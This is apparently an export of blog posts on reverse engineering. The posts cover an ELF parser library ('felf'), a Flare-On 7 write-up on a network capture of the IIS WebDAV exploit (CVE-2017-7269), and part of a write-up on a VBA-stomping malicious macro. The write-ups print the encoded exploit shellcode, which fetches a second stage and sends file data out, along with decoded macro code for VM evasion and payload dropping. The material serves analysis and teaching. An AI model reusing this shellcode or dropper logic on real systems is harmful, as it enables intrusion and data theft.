0x%x\\n\", num_sections, section_size, (uint64_t) addr + section_entry_offset);  25 Sections, with 64 bytes each and starting at address 0x82702f68Your numbers might differ based in the file that are you using and the mapped address that is used to calculate the entry of the array.Now, we need to find the string table that will be used as an array, lucky for us, the index string table in the section array is easily found in the ELF header, in the field e_shstrndx, to find the address using this index we just need to get the address of the first entry in the array and multiple the index with the size of each section.pseudo-code:string_table_address = (index * section_size) + first_entry_addressorstring_table_address = section_size + sectionOr even better, we can just get the first section address and just add the section_size, if you are familiar in how an array really works in memory, this will be easy to understand.C code:Elf64_Shdr* string_table_section = (Elf64_Shdr*) ( (uint64_t) section + ((uint64_t) section_size * elf_header-&gt;e_shstrndx));Finding the .text string indexNow with the section header loaded, we can find the offset where the section data is stored, as this is only the header and the real content is in another place in the file, this data location is found in the field sh_offset in the section header, so in order to find the array we just need to get the mapped file address + section-&gt;sh_offset.After find the raw data in the file we just need to work how it’s is specified in the ELF specs, this is a normal C-String array with the \\00 as delimiter.C code to find the first entry in string table:section_name = (char*) (( (uint64_t) string_table_section-&gt;sh_offset + addr) + 1);This will access the string array and get the first element, in order to pick the sections name we need access the field sh_name in the section header that holds the name index of this section in the string array, using that we can iterate in each section of the file and get each name easily, check the code:Elf64_Shdr* section = (Elf64_Shdr*) ((uint64_t) addr + section_entry_offset);\tElf64_Shdr* string_table_section = (Elf64_Shdr*) ( (uint64_t) section + ((uint64_t) section_size * elf_header-&gt;e_shstrndx));char* section_name;for (int i = 0; i &lt; num_sections; ++i) {    section = (Elf64_Shdr*) ((uint64_t) section + section_size);    section_name = (char*) (( (uint64_t) string_table_section-&gt;sh_offset + addr) + section-&gt;sh_name);}Changing the .text nameNow, it’s pretty simple, we can modify the name directly and as this file is mapped in memory in read-write mode our changes will be flushed directly in the disk file, take a look:for (int i = 0; i &lt; num_sections; ++i) {    section = (Elf64_Shdr*) ((uint64_t) section + section_size);    section_name = (char*) (( (uint64_t) string_table_section-&gt;sh_offset + addr) + section-&gt;sh_name);    if (!strcmp(section_name, \".text\")) {        strcpy(section_name, \".txet\");    }}Now take a look using readelf command to get all sections name:The program still works because the new name is following all the elf specs, and it’s a valid one.Enter felfNow let’s start the real reason of this article, let’s talk about felf.Why felfA couple months, I wanted to build a simple program that extract section hashs of a bunch of elf files, I also wanted to write that in C++ because it’s a languange that I enjoy, and I want to write everything from scratch without any helper library.My project didn’t worked the way I wanted and I just abandoned it, but I developed new cool library in C++ to work with elf files, that’s the story.The name Felf came from the nasm command parameters, if you will want to build a elf file from a nasm file, you pass the paremeter -f with value elf, almost everyone use that two together so the whole command become nasm -felf…InstallingFelf is written in C++ using cmake, so in order to install you will need any modern cpp compiler (g++, llvm…) and of course, cmakeAutomatic installationgit clone https://github.com/buzzer-re/felf.gitcd felf &amp;&amp; ./install.shThe installation script will build for release and install/strip the shared librariesFirst time usingLet’s start by the simplest operation possible, load and print the elf magic number, just like we did before from scratch, in felf this is very simple to perform.#include &lt;felf/ELF.h&gt;#include &lt;iostream&gt;int main() {    ELF elf(\"/usr/bin/ip\", MAP_RO);    if (elf.valid()) {\t\tstd::cout &lt;&lt; \"Elf loaded, parsing e_indent value\\n\";\t\t\tunsigned char* e_indent = elf.elfHeader-&gt;e_ident;\t\tfor (int i = 0; i &lt; EI_NIDENT; ++i) {\t\t\tstd::printf(\"e_indent[%d] = 0x%x(%c)\\n\", i, e_indent[i], e_indent[i]);\t\t}\t}}Compile:  g++ -o header_dump header_dump.cpp -lfelf++Let’s breakdown this call:  ELF constructor needs the path for the file and the open mode  You also should check if the file is a valid elf file, this is done by a magic number test  Almost all internal structures are now mapped inside the ELF objectWhen opening a file, you must tell felf how to map this file in memory, as this is using mmap from behind the scenes:      MAP_RO: Map the file in Read only mode in memory        MAP_RW: Map the file in Read-Write mode in memory, if you want to patch the file somehow, this will reflect directly in the file.        MAP_EX: Map the file in Read-Execute mode in memory  Please refer to the structures section in the README file, this will show all the structures that are currently supported/mapped.Cool usagesSymbol and Section dumpWith this library in mind, we can now do a lot of useful operations quickly using the internal structures, the first one I want to show it’s a simple symbol and section dump using the Symbol table and the Section table structure.#include &lt;felf/ELF.h&gt;int main(int argc, char** argv) {\t\tif (argc != 2) {\t\tstd::fprintf(stderr, \"Usage: %s &lt;path_to_elf&gt;\\n\", argv[0]);\t\treturn 1;\t}\tELF elf(argv[1], MAP_RO);\tif (elf.valid()) {\t\t\t\tstd::printf(\"Dumping symbol table with %d symbols\\n\", elf.symbolTable.length);\t\t\t\tfor (auto it = elf.symbolTable.symbolDataMapped.begin(); it != elf.symbolTable.symbolDataMapped.end(); ++it) {\t\t\tstd::printf(\"Symbol name: %s\\n\", it-&gt;first.c_str());\t\t}\t\tstd::printf(\"\\n\\nDumping section table with %d symbols\\n\", elf.elfSection.length);\t\t\t\tfor (auto it = elf.elfSection.sectionsMapped.begin(); it != elf.elfSection.sectionsMapped.end(); ++it) {\t\t\tstd::printf(\"Section name: %s at \", it-&gt;first.c_str());\t\t\tstd::printf(\"0x%x\\n\", it-&gt;second-&gt;sh_offset);\t\t}\t'\t}}The above code takes a input elf file, map into memory in read-only mode and parse all the elf structures, the internal variable symbolTable it’s a good example of why I created this library, you can access the unordered_map, that is a C++ implementation of a hashtable without order, and that holds all the symbols names as key and the SymbolData structure as value, this means that if you can quick lookup any of symbol in the file you can just use the find.Output:Symbol dumpingUsing the same idea above, in the next example I will dump the raw data of the main, if the binary isn’t stripped, and pipe that out to radare2.auto symbolIter = elf.symbolTable.symbolDataMapped.find(\"main\");if (symbolIter != elf.symbolTable.symbolDataMapped.end()) {    // Found        // Loop in SymbolData structure raw data    for (unsigned i = 0; i &lt; symbolIter-&gt;second-&gt;size; ++i) {        std::printf(\"%c\", symbolIter-&gt;second-&gt;data[i]);    }}Ignoring all the code that load and check the file, the code above it’s pretty straight forward, make a quick lookup at the symbolData map, and extract the raw data of this symbol to the stdout, with that I will pipe that out to radare2 framework and disassemble all (print disassembly all aka pdf).Very cool, right?Elf disassemblyNow that we fully understand the power of this simple library, let’s build something cool from scratch, a ELF disassembler, for this we will need to write our asm parser or use a already created library for that, I will use the Capstone engine to perform that for us, so go grab that before continue (if you are trying the examples above), and take a look at a simple example using this engine.In order to disassemble something, we must get the valid instructions that contains the opcodes, opcode are just a byte that has a meaning in the CPU, and the readable value of this opcode is called mnemonic, so the opcode 0x55  has the mnemonic push and the operators xbp where x differ based in the arch of the CPU, in x64 it’s rbp and x86 ebp, in order words, if one executable section of our memory contains any raw byte and the Instruction pointer are pointing to that area, our CPU will read this instructions and execute that.For the sake of simplicity, I will disassembly the .text section of a elf file, I will use the sectionTable map to extract the raw data of this section and use the capstone engine to disassembly that.The section dataTo get the section data you just need to use the internal variable elfSection and extract the length and their raw data:std::cout &lt;&lt; \"Loading .text data...\\n\";auto sectionIter = elf.elfSection.sectionData.find(\".text\");if (sectionIter != elf.elfSection.sectionData.end()) {    unsigned char* sectionData = sectionIter-&gt;second-&gt;data;\t    std::cout &lt;&lt; \"Starting Capstone engine...\\n\";    std::cout &lt;&lt; \"\\n\\nSection .text:\\n\\n\";    capstone_disas(sectionData, sectionIter-&gt;second-&gt;size);}And the capstone_disas function is written as:void capstone_disas(unsigned char* data, unsigned size){\tcsh handle;\tcs_insn* insn;\tsize_t codeCount;\tif (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle) != CS_ERR_OK) {\t\tstd::cerr &lt;&lt; \"Error when starting capstone!\\n\";\t\treturn;\t}\tcodeCount = cs_disasm(handle, data, size, 0x1000, 0, &amp;insn);\tif (codeCount &gt; 0) {\t\tunsigned j;\t\tfor (j = 0; j &lt; codeCount; ++j) {\t\t\tstd::\tprintf(\"0x%\"PRIx64\":\\t%s\\t\\t%s\\n\", insn[j].address, insn[j].mnemonic, insn[j].op_str);\t\t}\t\tcs_free(insn, codeCount);\t\t\t}}This function, starts the capstone engine in x86 architecture and in x64 mode, then we just send the whole data that we want to disassemble and the cs_insn struct pointer, that holds information like the mnemonic value and operators values.Compile:  g++ -o text_disas text_disas.cpp -lfelf++ -lcapstoneRun:Ready to build your own reverse engineering tools ?ConclusionYou see that this tiny and little x64 elf parser can do, and it’s has a very simple code to parse everything in C++ structures, I hope that this article helped you to understand more about the ELF format and executable formats in general.This project has a lot potential to grow up, and I have a lot ideas like: Python and Golang bindings, Code refactoring and more support for different architectures.Thanks for reading all this, and if this article has any mistake, fell free to open a issue in the felf project and I will fix.Revision by: @jvslg"
  },
  
  {
    "title": "Data exfiltration: From shellcode to flag",
    "url": "/posts/Retrieving-the-exfiltrated-flag-flareon7/",
    "categories": "Reverse-Engineering",
    "tags": "Network analysis, Shellcode analysis, Programming, Reverse engineering",
    "date": "2020-10-23 20:25:36 -0300",
    





    
    "snippet": "At Flare 7th edition, my favorite challenge was re_crowd, this challenge was really close to a very real world scenario, with just an pcap we are able to understand how the company was attacked, wh...",
    "content": "At Flare 7th edition, my favorite challenge was re_crowd, this challenge was really close to a very real world scenario, with just an pcap we are able to understand how the company was attacked, what exploit was used and what shellcode was sent, literally: Why, what and how ?Why is this useful ?Networking analysisEverything was a dump of the network traffic, every analysis need to be done in top of a pcap file, this is all we need to understand the following points:  The protocol exploited  The service exploited  The exploit used  The shellcode used  The data exfiltratedEncoded polyphormic Shellcode analysisAlso, we need to be able to debug a shellcode, this is very uncommon in CTF challenges and this was the first time I ever seen a challenge with that. With a extracted shellcode from the pcap, we will do the following:  Fix the payload to use the correct unicode format  Reverse engineer a polymorphic shellcode routine  Understand the encode routine  Be able to create a fake C2 infrastructure to retrieve the exfiltrated dataSo, let’s start our analysis!Message:Hello,Here at Reynholm Industries we pride ourselves on everything.It's not easy to admit, but recently one of our most valuable servers was breached. We don't believe in host monitoring so all we have is a network packet capture.We need you to investigate and determine what data was extracted from the server, if any.Thank youReconContextFirst, we can read this pcap file with Wireshark, there you can see that the traffic starts with an HTTP request in a new Web forum of Reynholm Industries, in their conversation, jen said that she kept the accounts files at c:\\accounts.txt, and that her need help to create their accounts in this new application.ExploitationLater on, we notice an request that look very strange, and after that packet the server connect back at por 4444 of the possible attacker, load something and then send some data to port 1337 of 192.168.68.21:This exploit is abusing of a Buffer overflow vulnerability in Windows server 2003 running IIS 6.0, I know that because it was a famous exploit that explore WebDav protocol,CVE-2017-7269, I also found the first published exploit from Zhiniang Peng &amp; Chen Wu.If you take a look at the exploit, it’s a buffer overflow + ROP chain exploitation, and the structure it’s very similar of this attack.Of course this is not the same file used here, as this exploit just pop calc.exe, and the attacker one looks to do much more (And notice that the first exploit don’t have the &gt; at the end of the shellcode).This exploit, is actually the Metasploit module of it, take a look at exploits/windows/iis/iis_webdav_scstoragepathfromurl exploit function:So here is how this is what the attacker is using to exploit the server, the exploits works like:  It first overflow the url path  After the overflow it make 3 ROP chains and load the encoded payload  All the bytes are encoded in unicode (I will back soon in this part)  The encoded payload is executedShellcode analysisOk, this is all the attack stages in order:So, after the shellcode succesfully execute in the server, it will download the stage2 from port 4444 and allocate and run the malicious code in memory then it will send something to port 1337.In order to get the data that was exfiltrated, we must:  Decode this shellcode  Reverse engineering their code  Understand how data is being encoded/encrypted  Get the exfiltrated data, aka flagSo, let’s go :)Alphanumeric shellcodesYou can cleary see that this shellcode is in plain text, if you never face that before you maybe think that this en encoded using base64/32, but it’s not.This is called Alphanumeric shellcode, an shellcode that was converted to a sequence of bytes that can be representated as chars, and this new code contain in itself the decompression routine, in order words, this shellcode is able to decode itself in memory and reveal the real code. I strongly recommend the following lectures, corlean.be and fuzzy security.This encoder is detect by it’s pattern and because is the default encoder of this payload, we can check that in the real exploit and in the metasploit module:A note about BufferRegisterIn order to this kind of shellcode work, it must need where he is in memory, because it will use his absolute address to start the decompression routine, this address must be supplied by a register, in metasploit the default register that will hold the shellcode address is ESI, for this exploit, but if you generate a alphanumeric shellcode it will by default create a prefix of 8 bytes, with non alpha bytes, that will set the right address to the register, if you use the option BufferRegister, it will remove this pre-instruction and will be the job of the exploit writer to find this address and load in the register that was chosen.A note about unicode shellcodeThis exploit is using an mixed unicode shellcode, it’s behaviour is the same as the alphanum, the only difference here is that this kind of encoding is used because windows use unicode as default charset (that’s why each instruction is converted to unicode-utf8 in the exploit), when windows load this shellcode, it will convert to unicode and the exploit will works normally.… A lot, uh ?Fixing the shellcode encodingAs I said before, this shellcode is expecting that windows “fix” to unicode, but I will manually run this exploit using scdbg and x64dbg, so I need this exploit in the correct encoding format.shellcode=\"VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA\"fixed_shellcode = b''for code in shellcode:    fixed_shellcode += code.encode()    fixed_shellcode += b'\\x00'with open(\"shellcode_fixed.bin\", \"wb\") as shellcode_fd:    shellcode_fd.write(fixed_shellcode)print(\"[+] Shellcode fixed [+]\")After that, we will have this:Rather then:Running shellcode in scdbgI will use scdbg for this task, we know that the exploit is already fixed, we can use scdbg to emulate this exploit instructions.Check that I’m using the option -esi base because the shellcode expect that this register hold his address, then we see that the shellcode is dynamic loading the library ws2_32, aka winsock, (Using LoadLibraryA), this library hold all the socket code, functions like connect and recv, later on it will connect as expect to port 4444, receive some data, and use VirtualAlloc to allocate a portion of the memory that will be used for the stage2.The fake C2 codeAt this point I had an idea, can I write a fake C2 that emulate what the attacker does ? And was exactly what I did, I create a simple C2 server that will send the same packets when the shellcode try the reach, and receive the same data, this way I can see with my own eyes what really happened in the server.Fake C2 codeimport socketimport osimport sysclass C2:\tdef __init__(self, ip, port, sender = True):\t\tself.sender = sender\t\tself.ip = ip\t\tself.port = port\t\tself.s = socket.socket()\t\tself.s.bind((self.ip, self.port))\t\tself.bytes_to_send = b''\t\tdef set_host_data(self, data_path):\t\tif not os.path.exists(data_path):\t\t\traise Exception(\"Unable to find file {}\".format(data_path))\t\t\t\tprint(\"Loading {}\".format(data_path))\t\twith open(data_path, \"rb\") as data_fd:\t\t\tself.bytes_to_send = data_fd.read()\t\t\t\tprint(\"Data loaded, ready to serve!\");\tdef listen(self):\t\tself.s.listen(1)\t\tprint(\"Wainting connections at {}:{}...\".format(self.ip, self.port))\t\twhile True:\t\t\tconn, addr = self.s.accept()\t\t\tif self.sender:\t\t\t\tprint(\"Received connection, sending bytes...\")\t\t\t\tconn.send(self.bytes_to_send)\t\t\t\tprint(\"Bytes sent!, closing...\")\t\t\telse:\t\t\t\tprint(\"Received connection, waiting data...\")\t\t\t\tdata = conn.recv(4096)\t\t\t\tsave_file = \"dump.bin\"\t\t\t\tprint(\"Received!, saving to {}\".format(save_file))\t\t\t\twith open(save_file, \"wb\") as save:\t\t\t\t\tsave.write(data)\t\t\t\tprint(\"Saved\")\t\t\tconn.close()if __name__ == '__main__':\tport   = int(sys.argv[1])\tfile_to_server = sys.argv[2]\tsender = sys.argv[3]\t\tc2 = C2(\"0.0.0.0\", port, sender == \"sender\")\tc2.set_host_data(file_to_server)\tc2.listen()I also created an file with a random content at C:\\accounts.txt, changed my local ip address to 192.168.68.21 and I ran again.Note that I added two more options in scdbg, -i for interactive mode, this will make some function access real resources, such ips, and -u to unlimited steps… but scdbg crashed because it don’t understand some opcodes,maybe some limitations of the libemu, the good part is that our fake c2 really worked, I was able to reply back the malicious packet and the shellcode really allocate and ran that, but this is not good enough, I need go deeper.Debugging shellcode in x64dbgI will use x64dbg for debug this shellcode, the steps to acomplish that, is:  Get a real process  Allocate memory  Copy our shellcode inside the process  Change EIP and fix ESI for the shellcodeOk, now it’s debugging time, I will just point the key parts of this shellcode/stage2 because a lot happened here.The first jumpAfter all the decode routine ends, the first jmp will be revealedNotice that the eax register actually holds the LoadLibrary address, and on the top of our stack we have the ws2_32 library, you need follow this jump in order to not lose the control of the shellcode, until you reach a safe point that you can put a useful breakpoint.After a while, I notice a lot of call functions to ebp register, so I just put some breaking points in a hope to find something useful in the callFollowing this calls, I found the Readfile function, after that I notice that my data was sent to a strange function that looks like a encryption routine, take a lookNotice that ESP holds my file data and Yes, I just fill with a bunch of A, later on I realized that was a bad idea, In the next call it will load all the alphabet characters and starts it encoding/encryption routine of my data.You can see that the key is loaded and my data is in the stack with a bunch of 0x41, the A’s before, It was a really bad idea fill with a unique byte… But, it really doesn’t matter, I already found the encryption loop, so I just need to analyze that, try to understand and write a decoder for th… no, please, just no.The simple idea that reveal the flagSo I don’t know if this was an act of miracle, or from where come this insight, but my idea was, what if I replace my C:\\accounts.txt with the encoded/exfiltrated data ?I literally did that, I dumped out the 1337 data from pcap and replace my C:\\accounts, I literally just ran the shellcode and wait my fake C2 dump the file out.After ran the shellcode (x64dbg clean the screen after finish), my C2 that was listening on port 1337, dumped something, and guess what ?roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat &lt;---moss:Pot-Pocket-Pigeon-Hunt-8:narwhaljen:Straighten-Effective-Gift-Pity-1:bunnyrichmond:Inventor-Hut-Autumn-Tray-6:birddenholm:123:dogConclusionBy the end of the write-up, you will notice the amount of steps that we acomplished:  Network analysis  Threat analysis  Shellcode analysis  Data exfiltration decodingThanks to all!"
  },
  
  {
    "title": "VBA Stomping: The macro hidden in plain sight",
    "url": "/posts/VBA-Stomping-flare/",
    "categories": "Malware-Research",
    "tags": "Malware analysis, Malware research, Programming, Reverse engineering",
    "date": "2020-10-23 20:23:36 -0300",
    





    
    "snippet": "At Flare-on 7th there was a very interesting malware analysis challenge that envolved a very unique hide technique for malicious Macros. This technique is called VBA Stomp, this works by hiding the...",
    "content": "At Flare-on 7th there was a very interesting malware analysis challenge that envolved a very unique hide technique for malicious Macros. This technique is called VBA Stomp, this works by hiding the real source code compiled in P-Code, the “bytecode” used in macros, and then making the visible source code as a fake one, if the malicious crafted document run in the same version that was previously compiled, the p-code will be executed.Why is this useful ?Document analysisEven more, malwares are embedded in documents, this challenge explores how can a malware can inject a malicious code and abuse from VBA macros to exploit machines.Advanced evasion techniqueVBA Stomp is the key of this challenge, and in my humble opinion, a amazing injection technique. The source code literally does not exists in plain text, we must go deeper in order to acomplish the real malware intentions.I was fooled in that challenge, and I want to share my write-up to solve this one, check it out.Challenge Message:Nobody likes analysing infected documents, but it pays the bills. Reverse this macro thrill-ride to discover how to get it to show you the key.In this challenge we need to analyse a malicious xls document that contain a malicious macro and make use modern and advanced techniques.ReconDocuments like xls, make use of OLE format, that format store documents, “folder” and bytes streams, its mainly used for documents like, docx, xlsx and others.I will use oletools to get some internal file informations, such all the streams and VBA projects inside this document, before open the document itself.OledumpWe can use oledump to get all the streams in the OLE file (document)Z:\\Projects\\CTF\\FlareOn2020\\report&gt;oledump.py -v report.xls  1:       108 '\\x01CompObj'  2:       244 '\\x05DocumentSummaryInformation'3:    352240 'Workbook'4:        97 '_VBA_PROJECT_CUR/F/\\x01CompObj'  5:       284 '_VBA_PROJECT_CUR/F/\\x03VBFrame'  6:       163 '_VBA_PROJECT_CUR/F/f'  7:   1143744 '_VBA_PROJECT_CUR/F/o'  8:       534 '_VBA_PROJECT_CUR/PROJECT'  9:        68 '_VBA_PROJECT_CUR/PROJECTwm' 10: m    1388 '_VBA_PROJECT_CUR/VBA/F' 11:     10518 '_VBA_PROJECT_CUR/VBA/Sheet1' 12: M    1785 '_VBA_PROJECT_CUR/VBA/ThisWorkbook' 13:      4327 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT' 14:      3345 '_VBA_PROJECT_CUR/VBA/__SRP_0' 15:       486 '_VBA_PROJECT_CUR/VBA/__SRP_1' 16:       592 '_VBA_PROJECT_CUR/VBA/__SRP_2' 17:       140 '_VBA_PROJECT_CUR/VBA/__SRP_3' 18:      3158 '_VBA_PROJECT_CUR/VBA/__SRP_4' 19:       473 '_VBA_PROJECT_CUR/VBA/__SRP_5' 20:       448 '_VBA_PROJECT_CUR/VBA/__SRP_6' 21:        66 '_VBA_PROJECT_CUR/VBA/__SRP_7' 22:       827 '_VBA_PROJECT_CUR/VBA/dir'We can see that we have VBA code at 10 and 12 streams, denoted by letter M, let’s dump that: Z:\\Projects\\CTF\\FlareOn2020\\report&gt;oledump.py -v report.xls -v -e -s10Attribute VB_Name = \"F\"Attribute VB_Base = \"0{4CAFACAA-2A4D-41F3-9B86-24F5964089BB}{A9F6A711-2CEB-4939-941D-EAC47AFB9092}\"Attribute VB_GlobalNameSpace = FalseAttribute VB_Creatable = FalseAttribute VB_PredeclaredId = TrueAttribute VB_Exposed = FalseAttribute VB_TemplateDerived = FalseAttribute VB_Customizable = FalseZ:\\Projects\\CTF\\FlareOn2020\\report&gt;oledump.py -v report.xls -v -e -s 12Attribute VB_Name = \"ThisWorkbook\"Attribute VB_Base = \"0{00020819-0000-0000-C000-000000000046}\"Attribute VB_GlobalNameSpace = FalseAttribute VB_Creatable = FalseAttribute VB_PredeclaredId = TrueAttribute VB_Exposed = TrueAttribute VB_TemplateDerived = FalseAttribute VB_Customizable = TrueSub Workbook_Open()Sheet1.folderolEnd SubSub Auto_Open()Sheet1.folderolEnd SubNotice that we have 2 VBA projects here, project F and project ThisWorkBook, but the script source was at Sheet1, take a look at the open function:Sub Workbook_Open()Sheet1.folderolEnd SubBut the oledump was very vague here, we just know that something called Sheet1.folderol is being called when the macro run, let’s dump the whole code using olevbaOlevbaolevba report.xls &gt; outputThat give to us a lot of useful information about the VB code inside, but I will stick in Sheet1 code, because it’s where the function folderol is found.Private Declare Function InternetGetConnectedState Lib \"wininet.dll\" _(ByRef dwflags As Long, ByVal dwReserved As Long) As LongPrivate Declare PtrSafe Function mciSendString Lib \"winmm.dll\" Alias _   \"mciSendStringA\" (ByVal lpstrCommand As String, ByVal _   lpstrReturnString As Any, ByVal uReturnLength As Long, ByVal _   hwndCallback As Long) As LongPrivate Declare Function GetShortPathName Lib \"kernel32\" Alias \"GetShortPathNameA\" _    (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal lBuffer As Long) As LongPublic Function GetInternetConnectedState() As Boolean  GetInternetConnectedState = InternetGetConnectedState(0&amp;, 0&amp;)End FunctionFunction rigmarole(es As String) As String    Dim furphy As String    Dim c As Integer    Dim s As String    Dim cc As Integer    furphy = \"\"    For i = 1 To Len(es) Step 4        c = CDec(\"&amp;H\" &amp; Mid(es, i, 2))        s = CDec(\"&amp;H\" &amp; Mid(es, i + 2, 2))        cc = c - s        furphy = furphy + Chr(cc)    Next i    rigmarole = furphyEnd FunctionFunction folderol()    Dim wabbit() As Byte    Dim fn As Integer: fn = FreeFile    Dim onzo() As String    Dim mf As String    Dim xertz As Variant        onzo = Split(F.L, \".\")        If GetInternetConnectedState = False Then        MsgBox \"Cannot establish Internet connection.\", vbCritical, \"Error\"        End    End If    Set fudgel = GetObject(rigmarole(onzo(7)))    Set twattling = fudgel.ExecQuery(rigmarole(onzo(8)), , 48)    For Each p In twattling        Dim pos As Integer        pos = InStr(LCase(p.Name), \"vmw\") + InStr(LCase(p.Name), \"vmt\") + InStr(LCase(p.Name), rigmarole(onzo(9)))        If pos &gt; 0 Then            MsgBox rigmarole(onzo(4)), vbCritical, rigmarole(onzo(6))            End        End If    Next            xertz = Array(&amp;H11, &amp;H22, &amp;H33, &amp;H44, &amp;H55, &amp;H66, &amp;H77, &amp;H88, &amp;H99, &amp;HAA, &amp;HBB, &amp;HCC, &amp;HDD, &amp;HEE)    wabbit = canoodle(F.T.Text, 0, 168667, xertz)    mf = Environ(rigmarole(onzo(0))) &amp; rigmarole(onzo(1))    Open mf For Binary Lock Read Write As #fn      Put #fn, , wabbit    Close #fn        mucolerd = mciSendString(rigmarole(onzo(2)) &amp; mf, 0&amp;, 0, 0)End FunctionFunction canoodle(panjandrum As String, ardylo As Integer, s As Long, bibble As Variant) As Byte()    Dim quean As Long    Dim cattywampus As Long    Dim kerfuffle() As Byte    ReDim kerfuffle(s)    quean = 0    For cattywampus = 1 To Len(panjandrum) Step 4        kerfuffle(quean) = CByte(\"&amp;H\" &amp; Mid(panjandrum, cattywampus + ardylo, 2)) Xor bibble(quean Mod (UBound(bibble) + 1))        quean = quean + 1        If quean = UBound(kerfuffle) Then            Exit For        End If    Next cattywampus    canoodle = kerfuffleEnd FunctionIn folderol function, we see that the function Split is being called with the VBName F, and access F.T, but F macro is shown as empty, let’s investigate:Decoding stringsThe F variable is a reference to a VBA form, you can see that is a simple user interface with encoded and encrypted data, take a lookI also used ssviewer to interpret the ole file itself, and I found in the stream o the same data in the form.Here we can see that we have some encoded data divided by “.”, this will give us a list of encoded strings, and each time that the malware wants to access an string, it calls the  rigmarole function, this function get the string in hex representation, and subtract the second byte for the first, jumping 2 bytes each time.Rigmarole function:Function rigmarole(es As String) As String    Dim furphy As String    Dim c As Integer    Dim s As String    Dim cc As Integer    furphy = \"\"    For i = 1 To Len(es) Step 4        c = CDec(\"&amp;H\" &amp; Mid(es, i, 2))        s = CDec(\"&amp;H\" &amp; Mid(es, i + 2, 2))        cc = c - s        furphy = furphy + Chr(cc)    Next i    rigmarole = furphyEnd FunctionNow we ca just split the same way that the malware do and run the same decode algorithm, here is the decode algorithm in python:from pprint import pprintdef decode_string(encoded_string):\tout = \"\"\tfor s in range(0, len(encoded_string), 4):\t\tc = int(encoded_string[s:s+2], base=16)\t\ts = int(encoded_string[s+2:s+4], base=16)\t\tcc = c - s\t\tout += chr(cc)\treturn out\tif __name__ == '__main__':\tencoded_values =  \"9655B040B64667238524D15D6201.B95D4E01C55CC562C7557405A532D768C55FA12DD074DC697A06E172992CAF3F8A5C7306B7476B38.C555AC40A7469C234424.853FA85C470699477D3851249A4B9C4E.A855AF40B84695239D24895D2101D05CCA62BE5578055232D568C05F902DDC74D2697406D7724C2CA83FCF5C2606B547A73898246B4BC14E941F9121D464D263B947EB77D36E7F1B8254.853FA85C470699477D3851249A4B9C4E.9A55B240B84692239624.CC55A940B44690238B24CA5D7501CF5C9C62B15561056032C468D15F9C2DE374DD696206B572752C8C3FB25C3806.A8558540924668236724B15D2101AA5CC362C2556A055232AE68B15F7C2DC17489695D06DB729A2C723F8E5C65069747AA389324AE4BB34E921F9421.CB55A240B5469B23.AC559340A94695238D24CD5D75018A5CB062BA557905A932D768D15F982D.D074B6696F06D5729E2CAE3FCF5C7506AD47AC388024C14B7C4E8F1F8F21CB64\".split(\".\")\t\tdecoded_values = []\tfor encoded in encoded_values:\t\tdecoded_values.append(decode_string(encoded))\t\t\tfor i,v in enumerate(decoded_values):\t\tprint(\"decoded_table[{}] = {}\".format(i, v))\t)This will give to us what I called, decoded_table, with this decoded strings it’s possible to interpret the code using the plain text strings. python decode_strings.pydecoded_table[0] = AppDatadecoded_table[1] = \\Microsoft\\stomp.mp3decoded_table[2] = play decoded_table[3] = FLARE-ONdecoded_table[4] = Sorry, this machine is not supported.decoded_table[5] = FLARE-ONdecoded_table[6] = Errordecoded_table[7] = winmgmts:\\\\.\\root\\CIMV2decoded_table[8] = SELECT Name FROM Win32_Processdecoded_table[9] = vboxdecoded_table[10] = WScript.Networkdecoded_table[11] = \\Microsoft\\v.png]Now, let’s just continue to read the script and when the malware call the decode string function, we just look at our decoded table.The evasion systemIn the code below, we can see that the malware has a simple evade system, I already decoded all the ringmarole calls for the real string value. Set fudgel = \"winmgmts:\\\\.\\root\\CIMV2\" Set twattling = fudgel.ExecQuery(\"SELECT Name FROM Win32_Process\")For Each p In twattling    Dim pos As Integer    pos = InStr(LCase(p.Name), \"vmw\") + InStr(LCase(p.Name), \"vmt\") + InStr(LCase(p.Name), \"vbox\")    If pos &gt; 0 Then        MsgBox rigmarole(\"Sorry, this machine is not supported\", vbCritical, \"Error\")        End    End IfNextIn order words, this code makes a wmi query to get all running process, and then, if some process contain any trace that is in the virtualized enviroment, an alert box will appear.Fake Stage 2 extractionUsing the decode table we can see when the second stage is dropped:# key ?xertz = Array(&amp;H11, &amp;H22, &amp;H33, &amp;H44, &amp;H55, &amp;H66, &amp;H77, &amp;H88, &amp;H99, &amp;HAA, &amp;HBB, &amp;HCC, &amp;HDD, &amp;HEE)wabbit = canoodle(F.T.Text, 0, 168667, xertz)mf = Environ(\"AppData\") &amp; \"\\Microsoft\\stomp.mp3\"Open mf For Binary Lock Read Write As #fn    Put #fn, , wabbitClose #fnmucolerd = mciSendString(\"play\" &amp;  mf, 0&amp;, 0, 0)So, 